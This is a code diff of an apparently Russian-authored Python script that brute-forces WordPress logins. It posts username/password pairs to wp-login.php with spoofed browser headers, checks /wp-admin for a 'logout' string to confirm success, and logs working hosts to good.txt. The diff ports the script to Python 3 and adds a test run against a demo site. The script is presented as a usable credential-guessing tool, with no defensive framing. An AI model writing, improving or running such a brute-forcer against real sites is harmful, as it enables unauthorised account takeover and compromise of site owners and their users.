@@ -3,9 +3,16 @@ import requests
 import time
 import os
 from threading import Thread, current_thread
-from Queue import Queue
+from queue import Queue
 
-headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'}
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'Accept-Language': 'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3',
+    'Accept-Encoding': 'gzip, deflate',
+    'Connection': 'keep-alive',
+    'DNT': '1'
+}
 
 #----login.txt----
 file = open('login.txt' , 'r')
@@ -26,26 +33,35 @@ file.close()
 #theard_count = 5
 def brut(host, login, pwd):
     url = 'http://'+host+'/wp-login.php'
+    payload = {
+    'log': login,
+    'pwd': pwd,
+    'wp-submit': 'Log+In',
+    'rememberme': 'forever',
+    'redirect_to': 'https://'+host+'/wp-admin',
+    'testcookie': '1'
+}
+    print(url)
+    print(payload)
     try:
         s = requests.Session()
-        response_get = s.get(url, headers=headers)
-        print s.cookies
-    except Exception:
-        print 'Host have error'
-    payload = {'log':login, 'pwd':pwd, 'wp-submit': 'Log+In', 'redirect_to': 'http://'+host+'/wp-admin/', 'testcookie': '1'}
-    #payload = {'log':login, 'pwd':pwd}
-    print url
-    print payload
-    try:
-        response = requests.post(url, data=payload, headers=headers, timeout = 10)
+        s.post(url, data=payload, headers=headers, timeout = 10)
     except Exception:
         return False
-        print 'Find ERROR'
-    response_get = requests.get('http://'+host+'/wp-admin')
+        print('Find ERROR')
+    response = s.get('http://'+host+'/wp-admin', headers=headers,)
+    print(response.text)
     if response.text.find('logout')>0:
         return True
     else:
         return False
+
+res = brut('demos1.softaculous.com/WordPress', 'admin', 'pass')
+if res:
+    print('1')
+else:
+    print('0')
+
 '''def brut(host):
     url = 'http://'+host+'/wp-login.php'
     #payload = {'log': login, 'pwd': pwd}
@@ -65,18 +81,18 @@ def brut(host, login, pwd):
                     return True
                 else:
                     return False'''
-for i in range(len(d_list)):
+'''for i in range(len(d_list)):
     url = d_list[i].strip()
     for i in range(len(l_list)):
         login = l_list[i].strip()    
         try:
-            if brut(url, login, 'user'):
+            if brut(url, login, 'pass'):
                 open('good.txt', 'a+').write(url + '\n')
                 print '1'
             else:
                 print '0'
         except Exception:
-            print 'error'
+            print 'error'''
 '''def run(queue, result_queue):
     # Цикл продолжается пока очередь задач не станет пустой
     while not queue.empty():
